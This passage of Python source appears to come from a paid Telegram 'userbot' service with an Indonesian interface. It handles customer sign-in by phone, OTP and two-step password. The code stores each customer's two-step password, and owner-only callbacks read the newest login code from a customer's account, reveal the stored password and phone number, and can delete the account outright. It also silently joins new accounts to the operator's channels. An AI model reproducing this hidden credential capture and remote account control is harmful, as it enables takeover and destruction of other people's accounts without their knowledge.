            f"  ᴘʀᴇғɪxᴇꜱ : {DataPrefix[0]}\n"
            f"  ᴇxᴘɪʀᴇᴅ ᴏɴ : {FormatWaktu}</b></blockquote>"
        )
        
        TombolKembaliStatus = [
            [
                InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {UserId}")
            ]
        ]
        
        return await callback_query.edit_message_text(
            TeksStatusAkses, 
            reply_markup=InlineKeyboardMarkup(TombolKembaliStatus)
        )
        
    else:
        
        TeksBelumBeli = "<blockquote><b>❌ ᴍᴀᴀғ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ, ꜱɪʟᴀᴋᴀɴ ᴍᴇᴍʙᴇʟɪ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ.</b></blockquote>"
        
        TombolBeliStatus = [
            [
                InlineKeyboardButton("💵 ʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ", callback_data="bahan")
            ], 
            [
                InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {UserId}")
            ]
        ]
        
        return await callback_query.edit_message_text(
            TeksBelumBeli, 
            reply_markup=InlineKeyboardMarkup(TombolBeliStatus)
        )

# ============================================================
# 📝 ᴘʀᴏꜱᴇꜱ ᴘᴇᴍʙᴜᴀᴛᴀɴ ᴜꜱᴇʀʙᴏᴛ
# ============================================================

@PY.CALLBACK("buat_ubot")
async def ProsesAwalBuatUbot(client, callback_query):
    """
    ʜᴀɴᴅʟᴇʀ ᴘᴇɴɢᴇᴄᴇᴋᴀɴ ꜱʏᴀʀᴀᴛ ꜱᴇʙᴇʟᴜᴍ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ.
    """
    UserId = callback_query.from_user.id
    
    if UserId in ubot._get_my_id:
        
        TeksSudahPunya = (
            "<blockquote><b>ᴀɴᴅᴀ ꜱᴜᴅᴀʜ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ\n\n"
            "ᴊɪᴋᴀ ᴜꜱᴇʀʙᴏᴛ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ꜱɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴇɴ ᴛᴏᴍʙᴏʟ ʀᴇꜱᴛᴀʀᴛ ᴅɪ ᴀᴛᴀꜱ</b></blockquote>"
        )
        
        TombolOpsiUbot = [
            [
                InlineKeyboardButton("✅ ʀᴇꜱᴛᴀʀᴛ ᴜʙᴏᴛ", callback_data="ress_ubot")
            ], 
            [
                InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {UserId}")
            ]
        ]
        
        return await callback_query.edit_message_text(
            TeksSudahPunya, 
            reply_markup=InlineKeyboardMarkup(TombolOpsiUbot)
        )
        
    if len(ubot._ubot) + 1 > MAX_BOT:
        
        TeksPenuh = (
            f"<blockquote><b>❌ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ!\n"
            f"📚 ᴍᴀᴋꜱɪᴍᴀʟ ᴜꜱᴇʀʙᴏᴛ ᴀᴅᴀʟᴀʜ {len(ubot._ubot)} ᴛᴇʟᴀʜ ᴛᴇʀᴄᴀᴘᴀɪ</b></blockquote>"
        )
        
        return await callback_query.edit_message_text(
            TeksPenuh, 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {UserId}")]])
        )
    
    DaftarAksesCek = [
        "PREM_USERS", "SELER_USERS", "ADMIN_USERS", "OWNER_USERS", 
        "KHASJIR_USERS", "CIOGWMAH_USERS", "ALLROLE_USERS"
    ]
    
    PunyaIzin = False
    
    for VariabelRole in DaftarAksesCek:
        
        CekUserDiDatabase = await get_list_from_vars(client.me.id, VariabelRole)
        
        if UserId in CekUserDiDatabase:
            
            PunyaIzin = True
            
            break
            
    if not PunyaIzin:
        
        TeksGakAdaIzin = "<blockquote><b>❌ ᴍᴀᴀғ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ, ꜱɪʟᴀᴋᴀɴ ᴍᴇᴍʙᴇʟɪ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ</b></blockquote>"
        
        return await callback_query.edit_message_text(
            TeksGakAdaIzin, 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💸 ʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ", callback_data="bahan")]])
        )
    
    TeksInstruksiBuat = (
        "<blockquote><b>✅ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ ꜱɪᴀᴘᴋᴀɴ ʙᴀʜᴀɴ ʙᴇʀɪᴋᴜᴛ\n\n"
        " • <code>ᴘʜᴏɴᴇ_ɴᴜᴍʙᴇʀ</code>: ɴᴏᴍᴇʀ ʜᴘ ᴀᴋᴜɴ ᴛᴇʟᴇɢʀᴀᴍ\n\n"
        "☑️ ᴊɪᴋᴀ ꜱᴜᴅᴀʜ ᴛᴇʀꜱᴇᴅɪᴀ ꜱɪʟᴀʜᴋᴀɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏɪ ᴅɪʙᴀᴡᴀʜ</b></blockquote>"
    )
    
    await callback_query.edit_message_text(
        TeksInstruksiBuat, 
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="add_ubot")]])
    )

# ============================================================
# 🔑 ᴘʀᴏꜱᴇꜱ ɪɴᴛɪ ᴘᴇɴᴀᴍʙᴀʜᴀɴ ᴜꜱᴇʀʙᴏᴛ (ᴏᴛᴘ)
# ============================================================

@PY.CALLBACK("add_ubot")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await bot.ask(
            user_id,
            (
                "<blockquote><b>sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋᴋᴀɴ ɴᴏᴍᴏʀ ᴛᴇʟᴇᴘᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅᴇɴɢᴀɴ ꜰᴏʀᴍᴀᴛ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ.\nᴄᴏɴᴛᴏʜ: ﹢𝟼𝟸xxxxx</b>\n"
                "\n<b>ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b></blockquote>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "<blockquote>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɴɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "<blockquote><b>ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ...</b></blockquote>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except ApiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"ERROR: {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>ᴀᴋᴜɴ ᴛᴇʟᴇɢʀᴀᴍ</a> ʀᴇsᴍɪ",
            SentCodeType.SMS: "sᴍs ᴀɴᴅᴀ",
            SentCodeType.CALL: "ᴘᴀɴɢɢɪʟᴀɴ ᴛᴇʟᴘᴏɴ",
            SentCodeType.FLASH_CALL: "ᴘᴀɴɢɢɪʟᴀɴ ᴋɪʟᴀᴛ ᴛᴇʟᴇᴘᴏɴ",
            SentCodeType.FRAGMENT_SMS: "ꜰʀᴀɢᴍᴇɴᴛ sᴍs",
            SentCodeType.EMAIL_CODE: "ᴇᴍᴀɪʟ ᴀɴᴅᴀ",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                "<blockquote><b>sɪʟᴀᴋᴀɴ ᴘᴇʀɪᴋsᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴅᴀʀɪ ᴀᴋᴜɴ ʀᴇꜱᴍɪ ᴛᴇʟᴇɢʀᴀᴍ. ᴋɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ ᴋᴇ sɪɴɪ sᴇᴛᴇʟᴀʜ ᴍᴇᴍʙᴀᴄᴀ ꜰᴏʀᴍᴀᴛ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ.</b>\n"
                "\nᴊɪᴋᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴀᴅᴀʟᴀʜ <ᴄᴏᴅᴇ>12345</ᴄᴏᴅᴇ> ᴛᴏʟᴏɴɢ <b>[ ᴛᴀᴍʙᴀʜᴋᴀɴ sᴘᴀsɪ ]</b> ᴋɪʀɪᴍᴋᴀɴ sᴇᴘᴇʀᴛɪ ɪɴɪ <code>1 2 3 4 5</code>\n"
                "\n<b>ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b></blockquote>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "<blockquote>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɴɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"ERROR: {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "ᴀᴋᴜɴ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴍᴇɴɢᴀᴋᴛɪꜰᴋᴀɴ ᴠᴇʀɪꜰɪᴋᴀsɪ ᴅᴜᴀ ʟᴀɴɢᴋᴀʜ. sɪʟᴀʜᴋᴀɴ ᴋɪʀɪᴍᴋᴀɴ ᴘᴀssᴡᴏʀᴅɴʏᴀ.\n\nɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "<blockquote>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɴɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"ERROR: {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs....\n\nsɪʟᴀʜᴋᴀɴ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ",
        disable_web_page_preview=True,
    )
    await new_client.start()
    if not user_id == new_client.me.id:
        ubot._ubot.remove(new_client)
        return await bot_msg.edit(
            "<blockquote><b>ʜᴀʀᴀᴘ ɢᴜɴᴀᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅɪ ᴀᴋᴜɴ ᴀɴᴅᴀ sᴀᴀᴛ ɪɴɪ ᴅᴀɴ ʙᴜᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴅᴀʀɪ ᴀᴋᴜɴ ʟᴀɪɴ</b></blockquote>"
        )
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
#    await remove_from_vars(client.me.id, "PREM_USERS", user_id)
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
    SH = await ubot.get_prefix(new_client.me.id)
    buttons = [
            [InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
        ]
    text_done = f"""
<blockquote><b>ʙᴇʀʜᴀꜱɪʟ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ
ɴᴀᴍᴇ : <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a>
ɪᴅ : {new_client.me.id}
ᴘʀᴇꜰɪxᴇꜱ : {' '.join(SH)}
ʜᴀʀᴀᴘ ᴊᴏɪɴ : t.me/aboutditzoffc ʜᴀʀᴀᴘ ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ ᴅɪᴀᴛᴀs ᴅᴀɴ ᴊᴀɴɢᴀɴ ᴏᴜᴛ ᴀɢᴀʀ sᴀғᴇᴛʏ
ᴊɪᴋᴀ ʙᴏᴛ ᴛɪᴅᴀᴋ ʀᴇꜱᴘᴏɴ, ᴋᴇᴛɪᴋ /restart</b></blockquote>
        """
    await bot_msg.edit(text_done, disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons))
    await bash("rm -rf *session*")
    await install_my_peer(new_client)
    try:
        await new_client.join_chat("aboutditzoffc")
        await new_client.join_chat("logubotditz")
        await new_client.join_chat("https://t.me/+C3819ttIPcRhZGNl")
        await new_client.join_chat("aboutditzoffc")
    except UserAlreadyParticipant:
        pass

    return await bot.send_message(
        LOGS_MAKER_UBOT,
        f""""
<b>❏ ᴜsᴇʀʙᴏᴛ ᴅɪᴀᴋᴛɪғᴋᴀɴ</b>
<b> ├ ᴀᴋᴜɴ:</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b> ╰ ɪᴅ:</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📁 ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ 📁",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
)

async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id, "<blockquote>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>"
        )
        return True
    return False

# ============================================================
# 🕹️ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ ᴅᴀɴ ʀᴇꜱᴛᴀʀᴛ ꜱʏꜱᴛᴇᴍ
# ============================================================

@PY.BOT("control")
async def MenuControlRestart(client, message):
    """
    ғᴜɴɢꜱɪ ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴀɴᴇʟ ᴋᴏɴᴛʀᴏʟ ʀᴇꜱᴛᴀʀᴛ ʙᴏᴛ.
    """
    TeksKontrol = (
        "<blockquote><b>ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʀᴇꜱᴛᴀʀᴛ?!\n\n"
        "ᴊɪᴋᴀ ɪʏᴀ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ</b></blockquote>"
    )
    
    await message.reply(
        TeksKontrol, 
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🔃 ʀᴇꜱᴛᴀʀᴛ ꜱᴇᴋᴀʀᴀɴɢ", 
                        callback_data="ress_ubot"
                    )
                ]
            ]
        )
    )

@PY.CALLBACK("ress_ubot")
async def AksiRestartUbot(client, callback_query):
    """
    ʟᴏɢɪᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ (ʀᴇꜱᴛᴀʀᴛ) ᴜꜱᴇʀʙᴏᴛ ᴛᴇʀᴛᴇɴᴛᴜ.
    """
    UserId = callback_query.from_user.id
    
    if UserId not in ubot._get_my_id:
        
        return await callback_query.answer(
            "ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀᴄᴄᴇꜱꜱ", 
            True
        )
        
    for AkunUbot in ubot._ubot:
        
        if UserId == AkunUbot.me.id:
            
            DaftarSemuaUbot = await get_userbots()
            
            for DataBot in DaftarSemuaUbot:
                
                if AkunUbot.me.id == int(DataBot["name"]):
                    
                    try:
                        
                        ubot._ubot.remove(AkunUbot)
                        
                        ubot._get_my_id.remove(AkunUbot.me.id)
                        
                        InstansiBaru = Ubot(
                            **DataBot
                        )
                        
                        await InstansiBaru.start()
                        
                        for Modul in loadModule():
                            
                            importlib.reload(
                                importlib.import_module(
                                    f"PyroUbot.modules.{Modul}"
                                )
                            )
                            
                        TeksBerhasilRestart = (
                            f"<b>ʀᴇꜱᴛᴀʀᴛ ʙᴇʀʜᴀꜱɪʟ ᴅɪʟᴀᴋᴜᴋᴀɴ !</b>\n\n"
                            f"<b>ɴᴀᴍᴇ:</b> {InstansiBaru.me.first_name}\n"
                            f"<b>ɪᴅ:</b> <code>{InstansiBaru.me.id}</code>"
                        )
                        
                        return await callback_query.edit_message_text(
                            TeksBerhasilRestart
                        )
                        
                    except Exception as ErrorRestart:
                        
                        return await callback_query.edit_message_text(
                            f"ᴇʀʀᴏʀ: {ErrorRestart}"
                        )

# ============================================================
# 🛠️ ᴛᴏᴏʟꜱ ᴀᴅᴍɪɴ (ɢᴇᴛ ᴏᴛᴘ, ᴘʜᴏɴᴇ, ᴅᴇᴀᴋ)
# ============================================================

@PY.CALLBACK("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
async def FiturAlatUserbot(client, callback_query):
    """
    ᴋᴜᴍᴘᴜʟᴀɴ ᴀʟᴀᴛ ʙᴀɴᴛᴜ ᴀᴅᴍɪɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴇʟᴏʟᴀ ᴀᴋᴜɴ ᴜꜱᴇʀʙᴏᴛ.
    """
    IdPengguna = callback_query.from_user.id
    
    DataAksi = callback_query.data.split()
    
    if IdPengguna != OWNER_ID:
        
        return await callback_query.answer(
            "ᴍᴀᴀғ, ᴛᴏᴍʙᴏʟ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴏᴡɴᴇʀ!", 
            True
        )
        
    UrutanUbot = int(DataAksi[1])
    
    TargetUbot = ubot._ubot[UrutanUbot]
    
    if DataAksi[0] == "get_otp":
        
        async for PesanOtp in TargetUbot.search_messages(
            777000, 
            limit=1
        ):
            if not PesanOtp.text:
                
                return await callback_query.answer(
                    "ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!", 
                    True
                )
                
            await callback_query.edit_message_text(
                f"<blockquote>{PesanOtp.text}</blockquote>", 
                reply_markup=InlineKeyboardMarkup(
                    BTN.UBOT(
                        TargetUbot.me.id, 
                        UrutanUbot
                    )
                )
            )
            
    elif DataAksi[0] == "get_phone":
        
        TeksNomerHp = (
            f"<b>📲 ɴᴏᴍᴏʀ ʜᴘ:</b> <code>{TargetUbot.me.phone_number}</code>"
        )
        
        await callback_query.edit_message_text(
            TeksNomerHp, 
            reply_markup=InlineKeyboardMarkup(
                BTN.UBOT(
                    TargetUbot.me.id, 
                    UrutanUbot
                )
            )
        )
        
    elif DataAksi[0] == "get_faktor":
        
        KodeA2l = await get_two_factor(
            TargetUbot.me.id
        )
        
        if not KodeA2l:
            
            return await callback_query.answer(
                "ᴀᴋᴜɴ ᴛɪᴅᴀᴋ ᴍᴇᴍɪʟɪᴋɪ ᴠᴇʀɪғɪᴋᴀꜱɪ ᴀ𝟸ғ!", 
                True
            )
            
        TeksA2l = (
            f"<b>🔐 ᴋᴏᴅᴇ ᴀ𝟸ғ:</b> <code>{KodeA2l}</code>"
        )
        
        await callback_query.edit_message_text(
            TeksA2l, 
            reply_markup=InlineKeyboardMarkup(
                BTN.UBOT(
                    TargetUbot.me.id, 
                    UrutanUbot
                )
            )
        )
        
    elif DataAksi[0] == "deak_akun":
        
        ubot._ubot.remove(TargetUbot)
        
        await TargetUbot.invoke(
            functions.account.DeleteAccount(
                reason="ꜱᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴅɪɢᴜɴᴀᴋᴀɴ"
            )
        )
        
        await callback_query.edit_message_text(
            "✅ ᴀᴋᴜɴ ᴜꜱᴇʀʙᴏᴛ ʙᴇʀʜᴀꜱɪʟ ᴅɪʜᴀᴘᴜꜱ ᴅᴀʀɪ ᴛᴇʟᴇɢʀᴀᴍ!", 
            reply_markup=InlineKeyboardMarkup(
                BTN.UBOT(
                    TargetUbot.me.id, 
                    UrutanUbot
                )
            )
        )

# ============================================================
# 📟 ɴᴀᴠɪɢᴀꜱɪ ᴅᴀғᴛᴀʀ ᴜꜱᴇʀʙᴏᴛ (ᴘʀᴇᴠ/ɴᴇxᴛ)
# ============================================================

@PY.CALLBACK("^(p_ub|n_ub)")
async def NavigasiDaftarUbot(client, callback_query):
    """
    ғᴜɴɢꜱɪ ɴᴀᴠɪɢᴀꜱɪ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴅᴀғᴛᴀʀ ᴜꜱᴇʀʙᴏᴛ ʏᴀɴɢ ᴀᴋᴛɪғ.
    """
    # Pastikan ada userbot yang terdaftar agar tidak error
    if not ubot._ubot:
        return await callback_query.answer("❌ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴜꜱᴇʀʙᴏᴛ ʏᴀɴɢ ᴀᴋᴛɪғ!", show_alert=True)

    SplitData = callback_query.data.split()
    IndeksSekarang = int(SplitData[1])
    
    # Logika perpindahan indeks (Next/Prev)
    if SplitData[0] == "n_ub":
        IndeksBaru = 0 if IndeksSekarang == len(ubot._ubot) - 1 else IndeksSekarang + 1
    else:
        IndeksBaru = len(ubot._ubot) - 1 if IndeksSekarang == 0 else IndeksSekarang - 1

    try:
        # Ambil data Userbot berdasarkan indeks baru
        TargetUbot = ubot._ubot[IndeksBaru]
        
        # Format teks pesan agar tidak "ketabrak"
        TeksPesan = (
            f"<blockquote><b>ᴍᴀɴᴀᴊᴇᴍᴇɴ ᴜꜱᴇʀʙᴏᴛ</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>ɴᴀᴍᴀ:</b> {TargetUbot.me.first_name} {TargetUbot.me.last_name or ''}\n"
            f"🆔 <b>ɪᴅ ᴘᴇɴɢɢᴜɴᴀ:</b> <code>{TargetUbot.me.id}</code>\n"
            f"🔢 <b>ᴜʀᴜᴛᴀɴ ᴋᴇ:</b> {IndeksBaru + 1} ᴅᴀʀɪ {len(ubot._ubot)}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>ɢᴜɴᴀᴋᴀɴ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴋᴏɴᴛʀᴏʟ</b></blockquote>"
        )

        await callback_query.edit_message_text(
            TeksPesan,
            reply_markup=InlineKeyboardMarkup(
                BTN.UBOT(
                    TargetUbot.me.id, 
                    IndeksBaru
                )
            )
        )
    except Exception as e:
        await callback_query.answer(f"❌ ᴇʀʀᴏʀ: {str(e)}", show_alert=True)
        

# ============================================================
# 🏁 ᴇɴᴅ ᴏғ ᴍᴏᴅᴜʟᴇ
# ============================================================
            